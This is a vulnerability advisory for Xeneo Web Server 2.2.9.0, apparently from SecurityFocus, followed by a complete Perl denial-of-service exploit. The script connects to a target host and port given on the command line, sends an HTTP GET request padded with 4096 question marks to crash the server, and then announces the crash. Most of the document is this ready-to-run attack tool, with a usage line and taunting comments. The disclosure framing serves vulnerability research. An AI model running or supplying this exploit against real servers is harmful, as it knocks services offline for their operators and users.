source: http://www.securityfocus.com/bid/7398/info

Xeneo web server has been reported prone to denial of service vulnerability.

It has been reported that a specifically crafted HTTP GET request containing over 4096 bytes of data will trigger this vulnerability.

Although absolutely unconfirmed, due to the nature of this vulnerability, memory corruption or arbitrary code execution may also be possible.

It should also be noted, that although this vulnerability has been reported to affect Xeneo web server version 2.2.9.0 previous versions may also be vulnerable. 

##!/usr/bin/perl
#
#
#
#SP Research Labs Advisory x03
#-----------------------------
#www.security-protocols.com
#
#Product - Xeneo Web Server 2.2.9.0
#
#Download it here:
#http://www.northernsolutions.com/index.php?view=product&id=1
#
#Date Released - 04/21/2003
#
#Release Mode - Vendor was notified on 3/18/2003.  Sent a few emails but
#never got any replies.  So here it goes.
#
#----------------------------
#
#Product Description from the vendor -
#
#Xeneo Web Server is designed to deliver high performance and
#reliability. It can be easily extended and customized to host
#everything from a personal web site to advanced web applications
#that use ASP, PHP, ColdFusion, Perl, CGI and ISAPI.  Key Xeneo
#Web Server features include: multiple domain support, integrated
#Windows authentication, scripting interface, enhanced filter
#support, ISAPI, CGI, ASP, SSL, intelligent file caching and more.
#
#-----------------------------
#
#Vulnerability Description -
#
#To exploit this vulnerability, simply do a GET / with 4096 ?'s or  more
#will cause the web server to go down.  It is not exploitable at this
#point.
#
#Tested on:
#
#Windows XP Pro SP1
#Windows 2000 SP3
#
#
# Xeneo Web Server DoS 
#
# Vulnerable systems:
# Xeneo. Web Server 2.2.9.0
# http://www.northernsolutions.com
# 
# Written by badpack3t <badpack3t@security-protocols.com>
# For SP Research Labs
# 04/21/2003
# 
# www.security-protocols.com
# 
# usage: 
# perl sp-xeneo.pl <target> <port>
#
# big ups 2: c0nnie!!!! 143~!~!~!

use IO::Socket;
use strict;

print ".:."x 20; print "\nXeneo Web Server 2.2.9.0 DoS, <badpack3t\@security-protocols.com>\n";
print ".:."x 20; print "\n\n";

if( !defined( $ARGV[ 0 ] && $ARGV[ 1 ]))
{
   &usage;
}

my $host     = $ARGV[ 0 ];
my $def      = "?";
my $num	     = "4096";
my $port     = $ARGV[ 1 ];
my $urfuqed  = $def x $num;

my $tcpval   = getprotobyname( 'tcp' );
my $serverIP = inet_aton( $host );
my $serverAddr = sockaddr_in( $ARGV[ 1 ], $serverIP );
my $protocol_name = "tcp";

my $iaddr    = inet_aton( $host ) 	       || die ( "host was not found: $host" );
my $paddr    = sockaddr_in( $port, $iaddr )    || die ( "you did something wrong stupid... exiting..." );
my $proto    = getprotobyname( 'tcp' )         || die ( "cannot get protocol" );
socket( SOCK, PF_INET, SOCK_STREAM, $proto )   || die ( "socket could not open: $host" );
connect( SOCK, $paddr ) 		       || die ( "cannot connect to: $host" );

my $submit   = "GET /$urfuqed HTTP/1.0\r\n\r\n";   
send( SOCK,$submit,0 );
close( SOCK );

sub usage 
{
   die( "\n\nUsage: perl $0 <target_host> <port>\n\n" );
}

print "\n.:.:.:.:.:.:.:.:.:.:.:.";
print "\ncrash was successful ~!\n";
print "\.:.:.:.:.:.:.:.:.:.:.:.\n";